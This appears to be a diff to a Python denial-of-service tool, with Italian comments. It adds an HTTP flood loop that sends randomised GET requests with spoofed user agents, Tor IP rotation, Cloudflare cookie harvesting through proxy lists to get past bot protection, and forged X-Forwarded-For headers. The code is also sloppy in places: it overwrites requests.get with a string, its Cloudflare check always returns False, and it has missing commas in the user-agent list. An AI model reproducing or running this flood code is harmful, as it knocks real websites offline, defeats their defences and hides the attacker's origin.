@@ -27,6 +27,7 @@ from request_limiter import request_limiter, LimitedIntervalStrategy, LimitExcep
 from aiocfscrape import CloudflareScraper
 from proxy_requests import ProxyRequests
 from ratelimiter import RateLimiter
+from toripchanger import TorIpChanger
 
 try: # se si è sotto linux scapy (per l'attacco tcp-udp) funziona
 	from scapy.all import * # importa scapy
@@ -157,6 +158,7 @@ def call_api(url):
               
 requests.get = ("google.com")
 
+import cloudscraper
 scraper = cloudscraper.create_scraper(debug=True)
 scraper = cloudscraper.create_scraper(delay=1000)
 proxies = {"http": "http://localhost:8080", "https": "http://localhost:8080"}
@@ -164,7 +166,7 @@ proxies = {"http": "http://google.com:8080","https": "https://google.com:8080"}
 scraper = cloudscraper.create_scraper(
     browser={
         'browser': 'firefox',
-        'mobile': False
+        'mobile': True
     }
 )
 scraper = cloudscraper.create_scraper(
@@ -189,7 +191,87 @@ scraper = cloudscraper.create_scraper(
 session = requests.session()
 scraper = cloudscraper.create_scraper(sess=session)
 
-                                                 
+
+strings = "asdfghlqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM1234567890"
+def HTTP(ip, port, path):
+	global stop
+	while True:
+		if stop :
+			break
+		try:
+			s=socket.socket()
+			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
+			s.settimeout(5)
+			s.connect((str(ip), int(port)))
+			if port == 80:
+				s = ssl.wrap_socket(s)
+			for y in range(100):
+				get_host = "GET "+path+"?"+str(random.randint(0,50000))
+				for _ in range(100):
+					get_host += strings[random.randint(0,len(strings))]
+				get_host += str(random.randint(0,50000))+ " HTTP/1.1\r\nHost: " + ip + "\r\n"
+				connection = "Connection: Keep-Alive\r\n"
+				useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
+				accept = random.choice(acceptall)
+				http = get_host + useragent + accept + connection + "\r\n"
+				s.send(str.encode(http))
+			s.close()
+		except:
+			pass
+                                                  
+def is_protected_by_cf():
+    try:
+        first_request = subprocess.check_output(
+            ["curl", "-A", format(random.choice(ua_file)), args.host], timeout=100)
+        first_request = first_request.decode("ascii", errors="ignore")
+        find_keyword = False
+        for line in first_request.splitlines():
+            if line.find("Checking your browser before accessing") != -1:
+                find_keyword = False
+    except Exception:
+        return False
+    return find_keyword
+
+def set_request():
+    global request
+    get_host = "GET " + args.dir + " HTTP/1.1\r\nHost: " + args.host + "\r\n"
+    useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
+    accept = random.choice(acceptall)
+    connection = "Connection: Keep-Alive\r\n"
+    request = get_host + useragent + accept + \
+              connection + "\r\n"
+    request_list.append(request)
+
+def generate_cf_token(i):
+    proxy = proxy_list[i].strip().split(":")
+    proxies = {"http": "http://" + proxy[0] + ":" + proxy[1]}
+    try:
+        cookie_value, user_agent = cfscrape.get_cookie_string(url, proxies=proxies)
+        tokens_string = "Cookie: " + cookie_value + "\r\n"
+        user_agent_string = "User-Agent: " + user_agent + "\r\n"
+        cf_token.append(proxy[0] + "#" + proxy[1] + "#" + tokens_string + user_agent_string)
+    except:
+        pass
+def set_request_cf():
+    global request_cf
+    global proxy_ip
+    global proxy_port
+    cf_combine = random.choice(cf_token).strip().split("#")
+    proxy_ip = cf_combine[0]
+    proxy_port = cf_combine[1]
+    get_host = "GET " + args.dir + " HTTP/1.1\r\nHost: " + args.host + "\r\n"
+    tokens_and_ua = cf_combine[2]
+    '''
+    print("ip: "+cf_combine[0]+"\n")
+    print("port: "+cf_combine[1]+"\n")
+    print("Cookie&UA: "+cf_combine[2]+"\n")
+    '''
+    accept = random.choice(acceptall)
+    randomip = str(random.randint(1, 255)) + "." + str(random.randint(0, 255)) + "." + str(random.randint(0, 255)) + "." + str(random.randint(0, 255))
+    forward = "X-Forwarded-For: " + randomip + "\r\n"
+    connection = "Connection: Keep-Alive\r\n"
+    request_cf = get_host + tokens_and_ua + accept + forward + connection + "\r\n"
+                                                     
 def limited(until):
     duration = int(round(until - time.time()))
     print('Rate limited, sleeping for {:d} seconds'.format(duration))
@@ -199,6 +281,7 @@ rate_limiter = RateLimiter(max_calls=200, period=3, callback=limited)
 for i in range(3):
     with rate_limiter:
         print('Iteration', i)
+
                                                                                                                                                                                          
 global data                          
 headers = open("headers.txt", "r")
@@ -324,6 +407,8 @@ useragents=["AdsBot-Google ( http://www.google.com/adsbot.html)",
                         "Mozilla/5.0 (Linux; Android 5.1.1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/2.3 Chrome/59.0.3071.125 Mobile Safari/537.36"
                         "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N)"
                         "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0"
+                        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
+                        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.99 Safari/537.36 Vivaldi/2.9.1705.41",
                         "Mozilla/5.0 (Linux; U; Android 9; ru-ru; Mi 9 Lite Build/PKQ1.181121.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/11.4.3-g"
                         "Mozilla/5.0 (Linux; Android 4.2.2; Philips S388 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Mobile Safari/537.36 OPR/34.0.2044.98679"
                         "Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)"
@@ -331,6 +416,8 @@ useragents=["AdsBot-Google ( http://www.google.com/adsbot.html)",
                        "APIs-Google (+https://developers.google.com/webmasters/APIs-Google.html)"
                        "Mozilla/5.0 (Linux; Android 4.4; Nexus 5 Build/_BuildID_) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36"
                        "Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16"
+                       "Mozilla/5.0 (Linux; U; Android 2.3.1; en-us; MID Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
+                       "Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; MID Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30 [FB_IAB/FB4A;FBAV/56.0.0.23.68;]",
                        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.137 Safari/537.36 OPR/67.0.3575.79"
                        "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
 "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
